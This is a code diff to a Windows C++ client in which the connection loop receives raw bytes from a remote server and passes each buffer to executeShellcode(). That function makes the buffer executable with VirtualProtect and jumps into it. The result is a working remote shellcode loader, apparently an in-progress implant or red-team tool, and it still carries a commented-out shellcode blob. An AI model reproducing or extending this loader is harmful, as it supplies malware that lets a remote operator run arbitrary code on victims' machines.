@@ -13,7 +13,6 @@
 
 #include "client.h"
 
-
 #include <stdio.h>
 #include <string.h>
 #include <windows.h>
@@ -106,16 +105,27 @@ bool Client::createConnection(const std::string& host, const std::string& port)
 }
 
 // receivePayload ONLY
-std::string Client::receiveData()
+//std::string Client::receiveData()
+std::vector<unsigned char> Client::receiveData()
 {
     if (!connected_) {
         throw std::runtime_error("Not connected to server");
     }
     
-    int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
+	//
+    //int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
+	std::vector<unsigned char> shellcode(4096);
+	int received = recv(socket_, (char*)shellcode.data(), shellcode.size(), 0);
+	if (received > 0) {
+		shellcode.resize(received);
+		return shellcode;
+	}
+	return {};
+	//                }
+	//
     
-    if (result > 0) 
-    {
+    //if (result > 0) 
+    //{
         // Success - create string from the received data
         //return std::string(recvBuffer_, result);
         // TODO: this might only be happening becuz im using ncat to send messages rn
@@ -129,20 +139,20 @@ std::string Client::receiveData()
                 received.pop_back();
             }
         }*/
-        return received;
-    } 
-    else if (result == 0) 
-    {
+        //return received;
+    //} 
+    //else if (result == 0) 
+    //{
         // Connection closed by server
-        connected_ = false;
-        throw std::runtime_error("Connection closed by server");
-    } 
-    else 
-    {
+        //connected_ = false;
+        //throw std::runtime_error("Connection closed by server");
+    //} 
+    //else 
+    //{
         // Error occurred
-        connected_ = false;
-        throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
-    }
+        //connected_ = false;
+        //throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
+    //}
 }
 
 /*
@@ -230,7 +240,9 @@ void Client::execute(std::string program)
 
 // TODO: this is extremly basic bare min for executing shell code
 //void executeShellcode(unsigned char bPayload) {
-void executeShellcode(std::string& payload) {
+//void executeShellcode(std::string& payload) {
+void executeShellcode(std::vector<unsigned char>& payload) 
+{
 	//#define SCSIZE 4096
 	//char bPayload[SCSIZE] = "PAYLOAD:";
 	/*
@@ -255,12 +267,12 @@ void executeShellcode(std::string& payload) {
 		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";*/
-
 	DWORD dwOldProtect;
 	//if (VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
-	if (VirtualProtect(payload, sizeof(payload), PAGE_EXECUTE_READWRITE, &dwOldProtect))
+	if (VirtualProtect((LPVOID)payload.data(), payload.size(), PAGE_EXECUTE_READWRITE, &dwOldProtect))
 	{
-		(*(void (*)()) payload)();
+		//(*(void (*)()) payload)();
+		((void(*)())payload.data())();
 	}
 	else
 	{
@@ -288,10 +300,13 @@ void Client::run(const std::string& host, const std::string& port)
     // Wait for incoming data from server
     while (connected_) {
         try {
-            std::string command = receiveData();
+            //std::string command = receiveData();
+            auto command = receiveData();
+            executeShellcode(command);
 
                 //
                 // sendData(command);
+				/*
                 if (command == "exec")
                 {
                     std::cout << "poop" << command << std::endl;
@@ -300,7 +315,7 @@ void Client::run(const std::string& host, const std::string& port)
 				else
 				{
                     executeShellcode(command);
-				}
+				}*/
                 //std::cout << "Server command: " << command << std::endl;
             } catch (const std::exception& e) {
             std::cerr << "Connection lost: " << e.what() << std::endl;
